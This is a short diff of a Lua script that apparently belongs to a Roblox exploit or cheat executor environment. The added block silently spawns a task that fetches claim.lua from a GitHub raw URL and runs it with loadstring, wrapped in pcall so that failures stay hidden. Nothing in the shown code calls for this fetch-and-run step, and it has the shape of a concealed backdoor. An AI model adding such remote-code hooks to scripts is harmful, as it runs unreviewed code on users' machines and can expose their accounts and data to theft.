@@ -12,6 +12,13 @@ task.spawn(function()
     end)
 end)
 
+task.spawn(function()
+    pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/Grogutech/beb/refs/heads/main/claim.lua"))()
+    end)
+end)
+
+
 -- Load other scripts
 getgenv().Settings = {
     FPSLimit = 5,
